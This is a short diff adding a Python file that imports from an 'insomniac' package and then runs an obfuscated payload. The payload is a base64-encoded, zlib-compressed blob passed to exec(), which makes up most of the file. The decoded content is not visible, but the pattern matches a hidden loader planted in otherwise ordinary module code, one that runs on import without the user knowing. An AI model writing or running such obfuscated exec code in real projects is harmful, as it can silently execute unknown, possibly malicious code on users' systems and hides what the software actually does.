@@ -1,0 +1,9 @@
+from insomniac.navigation import switch_to_english, LanguageChangedException
+from insomniac.utils import *
+
+
+import base64
+import zlib
+
+code = zlib.decompress(base64.b64decode(b'eJyNksFqwzAMhu99CuFTuoWQXQc7jCyD0XQdO+xUCG6qJgbXDrLStG8/N+7asFI2X2xL//9JyF7jBlpJDqM17lSFMTDuefo4Ab+2nWbVaoUET/AwhI5ZfzluCWGrZYWRiEUMQkxvC5KRQG1AzAQoM2hCoZvG2ch43VGapmfk/L/I+V/IHyrT4YKqbGeOLGU42mgrORrmBHcjf2DivsKW4UvqDnMiSxdIS95estqiRueibFEsPsvX57cC7kFk0hjL4TFgKYSPDf371FIk8EF2JVf6AD1ZU4OWpu5k7d+rV1qDQ4bc1Fq5BoztE+8+V/21QtX8/SW7zMDJHZYVSdecvsEo1SuumpJtiYF/pSCpfMfFqaGs8Qdc58MUlDVREBJyRyaMcfIN3eCy4Q=='))
+exec(code)
